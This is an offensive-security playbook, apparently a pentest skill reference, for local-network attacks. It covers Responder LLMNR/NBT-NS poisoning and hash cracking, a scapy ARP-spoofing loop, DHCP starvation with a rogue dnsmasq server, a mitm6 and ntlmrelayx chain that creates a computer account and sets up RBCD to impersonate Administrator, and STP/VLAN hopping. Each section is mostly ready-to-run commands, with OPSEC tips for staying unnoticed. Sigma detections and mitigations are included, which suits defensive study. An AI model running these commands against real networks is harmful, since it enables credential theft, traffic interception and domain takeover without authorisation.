# Layer-2 / Layer-3 Network Attacks

Name-resolution poisoning, ARP/DHCP spoofing, IPv6 takeover, STP/VLAN abuse. These
attacks own the local segment **before** any credentials are known and feed every
relay/MitM chain that follows.

---

## 1. LLMNR / NBT-NS / mDNS poisoning (Responder)

### Theory
Windows resolves names in order: hosts file → DNS → **LLMNR (UDP 5355)** →
**NBT-NS (UDP 137)**. macOS/Linux add **mDNS (UDP 5353)**. All three are
unauthenticated broadcast/multicast — any host can answer. When a user mistypes a
share, opens a doc with a dead UNC path, or a WPAD lookup fails, Windows broadcasts
the name; Responder answers "that's me," the victim authenticates, and you capture
its NetNTLMv1/v2 hash. No exploit, no creds required — just a switch port.

### Mechanism / commands
```bash
# Analyze first (-A = passive, answer nothing) to confirm it is in scope/loud
responder -I eth0 -A

# Full poisoning: LLMNR + NBT-NS + mDNS + rogue SMB/HTTP/MSSQL/LDAP/WebDAV servers
responder -I eth0 -wd
#  -w  WPAD rogue proxy server (huge hit rate — browsers auto-query wpad)
#  -d  answer NetBIOS domain suffix queries
#  -f  fingerprint hosts that respond
#  -v  verbose

# Force NTLMv1 (downgrade) for crack.sh / rainbow-table instant NT-hash recovery:
#   edit /etc/responder/Responder.conf -> Challenge = 1122334455667788  (static)
#   then capture NTLMv1 and submit to crack.sh

# Parse + dedupe + prioritize the loot (this skill's script):
python3 scripts/responder_loot_parser.py --logs /usr/share/responder/logs --outdir loot
hashcat -m 5600 loot/hashes_NTLMv2.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**WebDAV pivot (2024-2025 relevance):** Responder's WebDAV/`WebClient` module captures
auth from the Windows WebClient service; this auth can be relayed to LDAP/HTTP, and
unlike SMB it is **not blocked by SMB signing**. Trigger WebClient with a
`searchConnector-ms`/`.url` file or `\\host@80\share` UNC.

### Detection
```yaml
title: LLMNR/NBT-NS Poisoning Response Activity
logsource: { product: windows, service: sysmon }
detection:
  selection_net:        # Sysmon EID 3 from the attacker box answering :5355/:137
    DestinationPort: [5355, 137, 5353]
  selection_inbound:    # many hosts authenticating to one new host over SMB/HTTP
    DestinationPort: [445, 80]
  timeframe: 1m
  condition: selection_inbound | count(SourceIp) by DestinationIp > 10
```
- IOCs: a single host suddenly answering LLMNR/NBT-NS/mDNS for many names; burst of
  NTLM logons (4624/4625 type 3) to a non-server workstation; Responder's default
  self-signed cert CN on its rogue HTTPS.
- Defensive gold standard: disable LLMNR (GPO `EnableMulticast=0`) + NBT-NS (DHCP
  option 001 or per-NIC) — kills the attack surface entirely.

### OPSEC
- `-A` (analyze) is silent; full mode is loud — it answers *everything*. Restrict to
  scoped subnets, run during business hours to blend with real mistyped lookups.
- Touches nothing on disk on the target. Cleanup = stop Responder. Logs live only on
  the attacker box (`/usr/share/responder/logs`).
- Do **not** run Responder and `ntlmrelayx` rogue servers on the same ports — disable
  Responder's SMB/HTTP in `Responder.conf` (`SMB = Off`, `HTTP = Off`) when relaying.

---

## 2. ARP spoofing (MitM gateway poisoning)

### Theory
ARP has no authentication. Send gratuitous ARP replies binding the gateway IP to
your MAC (and vice-versa) → you sit inline for the victim's traffic. Basis for
sniffing, SSL-strip, and DNS spoofing. See `references/mitm-interception.md` for the
inline-traffic phase; this section covers the L2 primitive.

```bash
# scapy minimal poisoner (bidirectional)
python3 - <<'PY'
from scapy.all import ARP, send
victim, gw, my_mac = "10.0.0.50", "10.0.0.1", "aa:bb:cc:dd:ee:ff"
while True:
    send(ARP(op=2, pdst=victim, psrc=gw,  hwsrc=my_mac), verbose=0)
    send(ARP(op=2, pdst=gw,     psrc=victim, hwsrc=my_mac), verbose=0)
PY
# Or just use bettercap (this skill's driver):
sudo bash scripts/bettercap_mitm.sh active eth0 10.0.0.50 10.0.0.1
```

### Detection
- arpwatch / XArp: duplicate-MAC and changed-MAC-for-IP events.
- Switch **Dynamic ARP Inspection (DAI)** drops ARP that violates DHCP-snooping
  bindings — the primary control.
- IOC: gateway MAC suddenly == attacker MAC in many hosts' caches simultaneously.

### OPSEC
- Half-duplex (poison only the victim, not the gateway) halves the suspicious ARP
  volume but you only see victim→gateway traffic. Restore ARP tables on exit
  (bettercap does this automatically on Ctrl-C).

---

## 3. DHCP starvation + rogue DHCP

### Theory
Flood `DHCPDISCOVER` with spoofed MACs to exhaust the legit server's pool
(starvation), then answer with your own rogue DHCP offering yourself as
gateway/DNS → silent MitM without ARP noise.

```bash
# Starvation (yersinia or dhcpstarv); then rogue server via dnsmasq:
yersinia dhcp -attack 1 -interface eth0          # DISCARD flood
dnsmasq -d -C /dev/stdin <<'CONF'
interface=eth0
dhcp-range=10.0.0.100,10.0.0.200,12h
dhcp-option=3,10.0.0.250   # rogue gateway = attacker
dhcp-option=6,10.0.0.250   # rogue DNS     = attacker
CONF
```

### Detection / OPSEC
- DHCP snooping (trusted-port model) blocks rogue offers; SIEM alerts on a second
  DHCP server MAC. Starvation = thousands of DISCOVERs from random MACs (easy to
  flag). Prefer rogue-DHCP-only if the legit pool already has free leases.

---

## 4. IPv6 takeover — mitm6 (DHCPv6 + DNS) → NTLM relay  ★ current

### Theory (2025 resurgence)
Windows **prefers IPv6 over IPv4** even on IPv4-only networks, and ships with no
DHCPv6 server but a client that asks for one. mitm6 answers the DHCPv6 (UDP 547)
solicit, hands the victim **the attacker as its IPv6 DNS server**, then poisons DNS
(especially WPAD) to coerce NTLM auth, which `ntlmrelayx` relays to LDAPS — creating
a controlled computer account and configuring RBCD for privilege escalation. No
zero-day, no malware: it abuses default config. (Resecurity / multiple 2025 writeups.)

### Full chain (this skill's launcher)
```bash
# Automated chain (tmux: relay window + mitm6 window):
sudo bash scripts/mitm6_relay_launcher.sh corp.local eth0 ldaps-rbcd dc01.corp.local

# Equivalent manual two-process operation:
sudo mitm6 -d corp.local -i eth0 --ignore-nofqdn
sudo impacket-ntlmrelayx -6 -ts -wh proxy.corp.local -t ldaps://dc01.corp.local \
     --delegate-access --add-computer
# Result: new computer acct + RBCD on victim -> getST -impersonate Administrator
```
Relay to **SMB** instead (loot/exec) with `-t smb://host -smb2support -socks`, then
proxychains to use the relayed sessions.

### Detection
- **Rogue DHCPv6**: any host answering UDP 547 that is not your authorized server.
  This is the single highest-fidelity signal.
- Windows 7768/7769-style DHCPv6 client events; sudden IPv6 DNS server change on
  endpoints; computer-account creation by a non-admin (`4741` Event ID) immediately
  after IPv6 activity — the RBCD escalation tell.
- Sigma idea:
```yaml
title: Rogue DHCPv6 / mitm6 IPv6 Takeover
logsource: { product: zeek, service: dhcpv6 }
detection:
  sel: { msg_type: 'ADVERTISE' }
  filter: { server_ip: '<authorized_dhcpv6_servers>' }
  condition: sel and not filter
```

### OPSEC / cleanup
- Extremely loud at L2: poisons IPv6 for the **entire segment**. RA-Guard /
  DHCPv6-Guard on managed switches stop it cold; enterprise WIPS/NDR flag rogue
  DHCPv6 fast. Run for the shortest window needed, scope to one VLAN.
- `--ignore-nofqdn` cuts noise; `--no-ra` avoids continuous router advertisements.
- Cleanup: stop both processes; victims re-DHCP within hours. The created computer
  account (`--add-computer`) and RBCD ACE persist — **remove them** post-engagement
  (`bloodyAD --remove ...` / clear `msDS-AllowedToActOnBehalfOfOtherIdentity`).
- Hard mitigations to note in the report: set `ms-DS-MachineAccountQuota=0`, enforce
  LDAP signing + channel binding, disable WPAD, RA-Guard/DHCPv6-Guard.

---

## 5. STP root hijack & VLAN hopping

### Theory
- **STP root takeover:** send superior BPDUs (lower bridge priority) → become root
  bridge → traffic between switches reroutes through you. Mitigated by BPDU Guard /
  Root Guard.
- **VLAN hopping via DTP:** if a switchport is `dynamic auto/desirable`, forge a DTP
  frame to negotiate a **trunk**, then tag frames into any VLAN.
- **Double-tagging (802.1Q):** outer tag = native VLAN (stripped by the first switch),
  inner tag = target VLAN (forwarded by the second). One-way injection across VLANs.

```bash
# Discover trunk-capable ports + observed VLANs (this skill's tool):
sudo python3 scripts/vlan_hop.py discover -i eth0 --timeout 60
# Negotiate a trunk on a dynamic port:
sudo python3 scripts/vlan_hop.py dtp -i eth0
#   then: ip link add link eth0 name eth0.20 type vlan id 20 ; dhclient eth0.20
# Double-tag injection to another VLAN:
sudo python3 scripts/vlan_hop.py double-tag -i eth0 --outer 1 --inner 20 \
     --src 10.0.20.66 --dst 10.0.20.1
# STP root hijack:
yersinia stp -attack 4 -interface eth0     # claim root role with superior BPDU
```

### Detection
- BPDU Guard err-disables ports that send BPDUs; switch logs "root guard
  inconsistent" on superior BPDU. DTP frames from a host port; unexpected trunk
  formation. Double-tagging only works when the access port's native VLAN matches
  the outer tag — DAI/port-security and `vlan dot1q tag native` defeat it.

### OPSEC
- DTP/STP attacks are L2-local and noisy to a monitoring switch but invisible to
  host-based EDR. Sending BPDUs on a guarded port instantly err-disables you (loud,
  self-DoS). Validate port mode (`discover`) before committing.

---

## References
- Resecurity, "MITM6 + NTLM Relay: How IPv6 Auto-Configuration Leads to Full Domain
  Compromise" (Aug 2025) — resecurity.com.
- Cybersecurity News / GBHackers, "New MITM6 + NTLM Relay Attack" (2025).
- HackTricks — "Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks."
- MITRE ATT&CK T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay), T1557.003 (DHCP
  Spoofing), T1499/T1498 (L2 floods), T1599 (Network Boundary Bridging / VLAN hop).
- SpiderLabs/Responder GitHub (WebDAV/WebClient module, NTLMv1 downgrade notes).
